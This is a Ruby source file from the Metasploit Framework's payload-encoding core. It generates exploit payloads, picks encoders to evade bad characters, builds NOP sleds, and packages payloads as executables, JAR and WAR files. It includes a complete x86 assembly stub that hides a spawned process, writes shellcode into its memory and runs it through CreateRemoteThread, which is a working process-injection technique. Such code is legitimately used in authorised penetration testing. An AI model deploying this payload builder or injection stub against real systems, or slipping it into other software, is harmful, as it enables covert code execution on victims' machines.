# $Id$

require 'msf/core'

module Msf

###
#
# This class wrappers an encoded payload buffer and the means used to create
# one.
#
###
class EncodedPayload

	include Framework::Offspring

	#
	# This method creates an encoded payload instance and returns it to the
	# caller.
	#
	def self.create(pinst, reqs = {})
		# Create the encoded payload instance
		p = EncodedPayload.new(pinst.framework, pinst, reqs)

		p.generate(reqs['Raw'])

		return p
	end

	#
	# Creates an instance of an EncodedPayload.
	#
	def initialize(framework, pinst, reqs)
		self.framework = framework
		self.pinst     = pinst
		self.reqs      = reqs
	end

	#
	# This method generates the full encoded payload and returns the encoded
	# payload buffer.
	#
	def generate(raw = nil)
		self.raw           = raw
		self.encoded       = nil
		self.nop_sled_size = 0
		self.nop_sled      = nil
		self.encoder       = nil
		self.nop           = nil
		self.iterations    = reqs['Iterations'].to_i
		self.iterations    = 1 if self.iterations < 1

		# Increase thread priority as necessary.  This is done
		# to ensure that the encoding and sled generation get
		# enough time slices from the ruby thread scheduler.
		priority = Thread.current.priority

		if (priority == 0)
			Thread.current.priority = 1
		end

		begin
			# First, validate
			pinst.validate()

			# Generate the raw version of the payload first
			generate_raw() if self.raw.nil?

			# Encode the payload
			encode()

			# Build the NOP sled
			generate_sled()

			# Finally, set the complete payload definition
			self.encoded = (self.nop_sled || '') + self.encoded
		ensure
			# Restore the thread priority
			Thread.current.priority = priority
		end

		# Return the complete payload
		return encoded
	end

	#
	# Generates the raw payload from the payload instance.  This populates the
	# raw attribute.
	#
	def generate_raw
		# corelanc0d3r
		# generate payload, we need the len before calling the optional generate_migrator()
		
		generated_payload = pinst.generate
		generated_payload << (reqs['Append'] || '')
		
		# do we need to include a migration stub ?
		
		migrate_stub = ''
		
		if reqs['Migrate'] and reqs['Migrate'].to_s.downcase == "true"

			# only works on win x86 - this would be a good place to check for architecture
			
			# get options

			delay = 0
			processname = 'cmd'

			if reqs['MigrateOptions']
				if reqs['MigrateOptions']['Delay']
					delay = reqs['MigrateOptions']['Delay'] 
				end
		
				if reqs['MigrateOptions']['Process']
					processname = reqs['MigrateOptions']['Process'] 
				end	
			end

			wlog("Creating migrator stub, process #{processname}, delay #{delay}")
			
			migrate_stub = generate_migrator('win','x86',generated_payload.length, processname, delay)

			wlog("Migrator stub generated, #{migrate_stub.length} bytes")
			
		end
		
		self.raw = (reqs['Prepend'] || '') + migrate_stub + generated_payload

		# If an encapsulation routine was supplied, then we should call it so
		# that we can get the real raw payload.
		if reqs['EncapsulationRoutine']
			self.raw = reqs['EncapsulationRoutine'].call(reqs, raw)
		end
	end

	#
	# Scans for a compatible encoder using ranked precedence and populates the
	# encoded attribute.
	#
	def encode
		# If the exploit has bad characters, we need to run the list of encoders
		# in ranked precedence and try to encode without them.
		if reqs['BadChars'] or reqs['Encoder'] or reqs['ForceEncode']
			encoders = pinst.compatible_encoders

			# If the caller had a preferred encoder, use this encoder only
			if ((reqs['Encoder']) and (preferred = framework.encoders[reqs['Encoder']]))
				encoders = [ [reqs['Encoder'], preferred] ]
			elsif (reqs['Encoder'])
				wlog("#{pinst.refname}: Failed to find preferred encoder #{reqs['Encoder']}")
				raise NoEncodersSucceededError, "Failed to find preferred encoder #{reqs['Encoder']}"
			end

			encoders.each { |encname, encmod|
				self.encoder = encmod.new
				self.encoded = nil

				# If there is an encoder type restriction, check to see if this
				# encoder matches with what we're searching for.
				if ((reqs['EncoderType']) and
				    (self.encoder.encoder_type.split(/\s+/).include?(reqs['EncoderType']) == false))
					wlog("#{pinst.refname}: Encoder #{encoder.refname} is not a compatible encoder type: #{reqs['EncoderType']} != #{self.encoder.encoder_type}",
						'core', LEV_1)
					next
				end

				# If the exploit did not explicitly request a kind of encoder and
				# the current encoder has a manual ranking, then it should not be
				# considered as a valid encoder.  A manual ranking tells the
				# framework that an encoder must be explicitly defined as the
				# encoder of choice for an exploit.
				if ((reqs['EncoderType'].nil?) and
				    (reqs['Encoder'].nil?) and
				    (self.encoder.rank == ManualRanking))
					wlog("#{pinst.refname}: Encoder #{encoder.refname} is manual ranked and was not defined as a preferred encoder.",
						'core', LEV_1)
					next
				end

				# If we have any encoder options, import them into the datastore
				# of the encoder.
				if (reqs['EncoderOptions'])
					self.encoder.datastore.import_options_from_hash(reqs['EncoderOptions'])
				end

				# Validate the encoder to make sure it's properly initialized.
				begin
					self.encoder.validate
				rescue ::Exception
					wlog("#{pinst.refname}: Failed to validate encoder #{encoder.refname}: #{$!}",
						'core', LEV_1)
					next
				end

				eout = self.raw.dup

				next_encoder = false

				# Try encoding with the current encoder
				#
				# NOTE: Using more than one iteration may cause successive iterations to switch
				# to using a different encoder.
				#
				1.upto(self.iterations) do |iter|
					err_start = "#{pinst.refname}: iteration #{iter}"

					begin
						eout = self.encoder.encode(eout, reqs['BadChars'], nil, pinst.platform)
					rescue EncodingError
						wlog("#{err_start}: Encoder #{encoder.refname} failed: #{$!}", 'core', LEV_1)
						dlog("#{err_start}: Call stack\n#{$@.join("\n")}", 'core', LEV_3)
						next_encoder = true
						break

					rescue ::Exception
						elog("#{err_start}: Broken encoder #{encoder.refname}: #{$!}", 'core', LEV_0)
						dlog("#{err_start}: Call stack\n#{$@.join("\n")}", 'core', LEV_1)
						next_encoder = true
						break
					end

					# Get the minimum number of nops to use
					min = (reqs['MinNops'] || 0).to_i
					min = 0 if reqs['DisableNops']

					# Check to see if we have enough room for the minimum requirements
					if ((reqs['Space']) and (reqs['Space'] < eout.length + min))
						wlog("#{err_start}: Encoded payload version is too large with encoder #{encoder.refname}",
							'core', LEV_1)
						next_encoder = true
						break
					end

					ilog("#{err_start}: Successfully encoded with encoder #{encoder.refname} (size is #{eout.length})",
						'core', LEV_0)
				end

				next if next_encoder

				self.encoded = eout
				break
			}

			# If the encoded payload is nil, raise an exception saying that we
			# suck at life.
			if (self.encoded == nil)
				encoder = nil

				raise NoEncodersSucceededError,
					"#{pinst.refname}: All encoders failed to encode.",
					caller
			end

		# If there are no bad characters, then the raw is the same as the
		# encoded
		else
			self.encoded = raw
		end

		# Prefix the prepend encoder value
		self.encoded = (reqs['PrependEncoder'] || '') + self.encoded
	end

	#
	# Construct a NOP sled if necessary
	#
	def generate_sled
		min   = reqs['MinNops'] || 0
		space = reqs['Space']

		self.nop_sled_size = min

		# Calculate the number of NOPs to pad out the buffer with based on the
		# requirements.  If there was a space requirement, check to see if
		# there's any room at all left for a sled.
		if ((space) and
			 (space > encoded.length))
			self.nop_sled_size = reqs['Space'] - self.encoded.length
		end

		# If the maximum number of NOPs has been exceeded, wrap it back down.
		if ((reqs['MaxNops']) and
			 (reqs['MaxNops'] < self.nop_sled_size))
			self.nop_sled_size = reqs['MaxNops']
		end

		# Check for the DisableNops setting
		self.nop_sled_size = 0 if reqs['DisableNops']

		# Now construct the actual sled
		if (self.nop_sled_size > 0)
			nops = pinst.compatible_nops

			# If the caller had a preferred nop, try to find it and prefix it
			if ((reqs['Nop']) and
			    (preferred = framework.nops[reqs['Nop']]))
				nops.unshift([reqs['Nop'], preferred ])
			elsif (reqs['Nop'])
				wlog("#{pinst.refname}: Failed to find preferred nop #{reqs['Nop']}")
			end

			nops.each { |nopname, nopmod|
				# Create an instance of the nop module
				self.nop = nopmod.new

				# The list of save registers
				save_regs = (reqs['SaveRegisters'] || []) + (pinst.save_registers || [])

				if (save_regs.empty? == true)
					save_regs = nil
				end

				begin
					nop.copy_ui(pinst)

					self.nop_sled = nop.generate_sled(self.nop_sled_size,
						'BadChars'      => reqs['BadChars'],
						'SaveRegisters' => save_regs)
				rescue
					dlog("#{pinst.refname}: Nop generator #{nop.refname} failed to generate sled for payload: #{$!}",
						'core', LEV_1)

					self.nop = nil
				end

				break
			}

			if (self.nop_sled == nil)
				raise NoNopsSucceededError,
					"#{pinst.refname}: All NOP generators failed to construct sled for.",
					caller
			end
		else
			self.nop_sled = ''
		end

		return self.nop_sled
	end
	
	
	# construct a migrator stub if necessary
	# corelanc0d3r
	def generate_migrator(platform, architecture, payloadlen, processname, delay)
	
		migrate = ''
	
		if platform.downcase == 'win' and architecture.downcase == 'x86'
	
			payloadsize = "0x%04x" % payloadlen
		
			procname = processname || 'cmd'
		
			delayval = delay || 3
		
			delayvalue = "0x%04x" % (delayval * 1000)

			migrate_asm = <<EOS
add esp,-400		; adjust the stack to avoid corruption
call main_routine	; start + push address of api_call onto the stack

; block_api code by Stephen Fewer
api_call:
	pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
	mov ebp, esp           ; Create a new stack frame
	xor edx, edx           ; Zero EDX
	mov edx, fs:[edx+48]   ; Get a pointer to the PEB
	mov edx, [edx+12]      ; Get PEB->Ldr
	mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
next_mod:
	mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
	movzx ecx, word [edx+38] ; Set ECX to the length we want to check 
	xor edi, edi           ; Clear EDI which will store the hash of the module name
loop_modname:            ;
	xor eax, eax           ; Clear EAX
	lodsb                  ; Read in the next byte of the name
	cmp al, 'a'            ; Some versions of Windows use lower case module names
	jl not_lowercase       ;
	sub al, 0x20           ; If so normalise to uppercase
not_lowercase:           ;
	ror edi, 13            ; Rotate right our hash value
	add edi, eax           ; Add the next byte of the name
	loop loop_modname      ; Loop untill we have read enough
	; We now have the module hash computed
	push edx               ; Save the current position in the module list for later
	push edi               ; Save the current module hash for later
	; Proceed to itterate the export address table, 
	mov edx, [edx+16]      ; Get this modules base address
	mov eax, [edx+60]      ; Get PE header
	add eax, edx           ; Add the modules base address
	mov eax, [eax+120]     ; Get export tables RVA
	test eax, eax          ; Test if no export address table is present
	jz get_next_mod1       ; If no EAT present, process the next module
	add eax, edx           ; Add the modules base address
	push eax               ; Save the current modules EAT
	mov ecx, [eax+24]      ; Get the number of function names  
	mov ebx, [eax+32]      ; Get the rva of the function names
	add ebx, edx           ; Add the modules base address
	; Computing the module hash + function hash
get_next_func:           ;
	jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
	dec ecx                ; Decrement the function name counter
	mov esi, [ebx+ecx*4]   ; Get rva of next module name
	add esi, edx           ; Add the modules base address
	xor edi, edi           ; Clear EDI which will store the hash of the function name
	; And compare it to the one we want
loop_funcname:           ;
	xor eax, eax           ; Clear EAX
	lodsb                  ; Read in the next byte of the ASCII function name
	ror edi, 13            ; Rotate right our hash value
	add edi, eax           ; Add the next byte of the name
	cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
	jne loop_funcname      ; If we have not reached the null terminator, continue
	add edi, [ebp-8]       ; Add the current module hash to the function hash
	cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for 
	jnz get_next_func      ; Go compute the next function hash if we have not found it
	; If found, fix up stack, call the function and then value else compute the next one...
	pop eax                ; Restore the current modules EAT
	mov ebx, [eax+36]      ; Get the ordinal table rva      
	add ebx, edx           ; Add the modules base address
	mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
	mov ebx, [eax+28]      ; Get the function addresses table rva  
	add ebx, edx           ; Add the modules base address
	mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
	add eax, edx           ; Add the modules base address to get the functions actual VA
	; We now fix up the stack and perform the call to the desired function...
finish:
	mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
	pop ebx                ; Clear off the current modules hash
	pop ebx                ; Clear off the current position in the module list
	popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
	pop ecx                ; Pop off the origional return address our caller will have pushed
	pop edx                ; Pop off the hash value our caller will have pushed
	push ecx               ; Push back the correct return value
	jmp eax                ; Jump into the required function
	; We now automagically return to the correct caller...
get_next_mod:            ;
	pop eax                ; Pop off the current (now the previous) modules EAT
get_next_mod1:           ;
	pop edi                ; Pop off the current (now the previous) modules hash
	pop edx                ; Restore our position in the module list
	mov edx, [edx]         ; Get the next module
	jmp next_mod     ; Process this module


; main routine - corelanc0d3r
main_routine:			; start of main routine
	pop ebp			; get pointer to api_call
	; retrieve & build startupinfo at esp+0x60
	; external/source/shellcode/windows/x86/src/hash.py kernel32.dll GetStartupInfoA
	; 0xB16B4AB1 = kernel32.dll!GetStartupInfoA
	mov edx,esp
	add edx,0x60
	push edx
	push 0xB16B4AB1
	call ebp		; get function pointer + call GetStartupInfoA

	; patch it
	mov [eax+0x2c],1             ; dwFLags : STARTF_USESHOWWINDOW (0x1)
	mov [eax+0x30],0             ; wShowWindow : SW_HIDE (0x0)

	; ptr to startupinfo is in eax
	; pointer to string is in ecx
	;
	; create the process
	; 0x863FCC79 = kernel32.dll!CreateProcessA
	mov edi,eax
	add edi,48
	push edi                      ; lpProcessInformation : write processinfo here
	push eax                      ; lpStartupInfo : current info (read)
	xor ebx,ebx
	push ebx                      ; lpCurrentDirectory
	push ebx                      ; lpEnvironment
	push 0x08000000               ; dwCreationFlags CREATE_NO_WINDOW
	push ebx                      ; bInHeritHandles
	push ebx
	push ebx
	jmp get_procname		; will put ptr to command on stack
get_procname_return:
	push ebx
	push 0x863FCC79
	call ebp

	; sleep, allow process to spawn
	; 0xE035F044 = kernel32.dll!Sleep
	push #{delayvalue}
	push 0xE035F044          
	call ebp

	; allocate memory in the process (VirtualAllocEx())
	; 0x3F9287AE = kernel32.dll!VirtualAllocEx
	; get handle
	mov ecx,[edi]
	push 0x40                     ; RWX
	add bh,0x10
	push ebx                      ; MEM_COMMIT
	push ebx                      ; size
	xor ebx,ebx
	push ebx                      ; address
	push ecx                      ; handle
	push 0x3F9287AE
	call ebp

	; eax now contains the destination
	; WriteProcessMemory()
	; 0xE7BDD8C5 = kernel32.dll!WriteProcessMemory
	push esp                      ; lpNumberOfBytesWritten 
	push #{payloadsize}           ; nSize 
	; pick up pointer to shellcode & keep it on stack (lpBuffer)
	jmp begin_of_payload
begin_of_payload_return:
	push eax                      ; lpBaseAddress 
	mov ecx,[edi]                 ; pick up handle again
	push ecx                      ; hProcess 
	push 0xE7BDD8C5
	call ebp

	; run the code (CreateRemoteThread())
	; 0x799AACC6 = kernel32.dll!CreateRemoteThread
	mov ecx,[edi]                 ; pick up handle again
	xor ebx,ebx
	push ebx                      ; lpthreadID
	push ebx                      ; run immediately
	push ebx                      ; no parameter
	mov ebx,[esp-0x4]
	push ebx                      ; shellcode
	xor ebx,ebx
	add bh,0x20
	push ebx                      ; stacksize
	xor ebx,ebx
	push ebx                      ; lpThreadAttributes
	push ecx
	push 0x799AACC6	
	call ebp              ; run staged shellcode

	;sleep
	push -1
	push 0xE035F044          
	call ebp

	;processname
get_procname:
	call get_procname_return
	db "#{procname}"
	db 0x00

begin_of_payload:
	call begin_of_payload_return

EOS

			migrate = Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
											
		end
	
		return migrate
		
	end


	#
	# Convert the payload to an executable appropriate for its arch and
	# platform.
	#
	# +opts+ are passed directly to +Msf::Util::EXE.to_executable+
	#
	# see +Msf::Exploit::EXE+
	#
	def encoded_exe(opts={})
		# Ensure arch and platform are in the format that to_executable expects
		if opts[:arch] and not opts[:arch].kind_of? Array
			opts[:arch] = [ opts[:arch] ]
		end
		if (opts[:platform].kind_of? Msf::Module::PlatformList)
			opts[:platform] = opts[:platform].platforms
		end

		emod = pinst.assoc_exploit if pinst.respond_to? :assoc_exploit

		if emod
			# This is a little ghetto, grabbing datastore options from the
			# associated exploit, but it doesn't really make sense for the
			# payload to have exe options if the exploit doesn't need an exe.
			# Msf::Util::EXE chooses reasonable defaults if these aren't given,
			# so it's not that big of an issue.
			opts.merge!({
				:template_path => emod.datastore['EXE::Path'],
				:template => emod.datastore['EXE::Template'],
				:inject => emod.datastore['EXE::Inject'],
				:fallback => emod.datastore['EXE::FallBack'],
				:sub_method => emod.datastore['EXE::OldMethod']
			})
			# Prefer the target's platform/architecture information, but use
			# the exploit module's if no target specific information exists.
			opts[:platform] ||= emod.target_platform  if emod.respond_to? :target_platform
			opts[:platform] ||= emod.platform         if emod.respond_to? :platform
			opts[:arch] ||= emod.target_arch          if emod.respond_to? :target_arch
			opts[:arch] ||= emod.arch                 if emod.respond_to? :arch
		end
		# Lastly, try the payload's. This always happens if we don't have an
		# associated exploit module.
		opts[:platform] ||= pinst.platform if pinst.respond_to? :platform
		opts[:arch] ||= pinst.arch         if pinst.respond_to? :arch

		Msf::Util::EXE.to_executable(framework, opts[:arch], opts[:platform], encoded, opts)
	end

	#
	# Generate a jar file containing the encoded payload.
	#
	# Uses the payload's +generate_jar+ method if it is implemented (Java
	# payloads should all have it).  Otherwise, converts the payload to an
	# executable and uses Msf::Util::EXE.to_jar to create a jar file that dumps
	# the exe out to a random file name in the system's temporary directory and
	# executes it.
	#
	def encoded_jar(opts={})
		return pinst.generate_jar(opts) if pinst.respond_to? :generate_jar

		opts[:spawn] ||= pinst.datastore["Spawn"]

		Msf::Util::EXE.to_jar(encoded_exe(opts), opts)
	end

	#
	# Similar to +encoded_jar+ but builds a web archive for use in servlet
	# containers such as Tomcat.
	#
	def encoded_war(opts={})
		return pinst.generate_war(opts) if pinst.respond_to? :generate_war

		Msf::Util::EXE.to_jsp_war(encoded_exe(opts), opts)
	end

	#
	# The raw version of the payload
	#
	attr_reader :raw
	#
	# The encoded version of the raw payload plus the NOP sled
	# if one was generated.
	#
	attr_reader :encoded
	#
	# The size of the NOP sled
	#
	attr_reader :nop_sled_size
	#
	# The NOP sled itself
	#
	attr_reader :nop_sled
	#
	# The encoder that was used
	#
	attr_reader :encoder
	#
	# The NOP generator that was used
	#
	attr_reader :nop
	#
	# The number of encoding iterations used
	#
	attr_reader :iterations

protected

	attr_writer :raw # :nodoc:
	attr_writer :encoded # :nodoc:
	attr_writer :nop_sled_size # :nodoc:
	attr_writer :nop_sled # :nodoc:
	attr_writer :payload # :nodoc:
	attr_writer :encoder # :nodoc:
	attr_writer :nop # :nodoc:
	attr_writer :iterations # :nodoc:

	#
	# The payload instance used to generate the payload
	#
	attr_accessor :pinst
	#
	# The requirements used for generation
	#
	attr_accessor :reqs

end

end
